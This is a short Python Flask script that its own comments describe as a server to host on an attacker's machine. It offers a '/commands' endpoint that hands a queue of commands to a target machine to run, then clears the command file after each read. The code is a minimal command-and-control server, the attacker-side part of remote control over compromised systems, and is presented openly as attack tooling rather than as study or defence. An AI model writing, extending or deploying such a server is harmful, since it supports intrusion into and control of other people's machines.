# flask server to host on attackers machine
# Provides an endpoint which will return a list of commands to run on the target machine

import flask

app = flask.Flask(__name__)

file_path = "commands.txt"

@app.route('/commands', methods=['GET'])
def commands():
    # return commands from file to run on target machine
    with open(file_path, 'r') as f:
        commands = f.read()

    # deletes commands from file after they are read
    with open(file_path, 'w') as f:
        f.write('')
        
    return commands
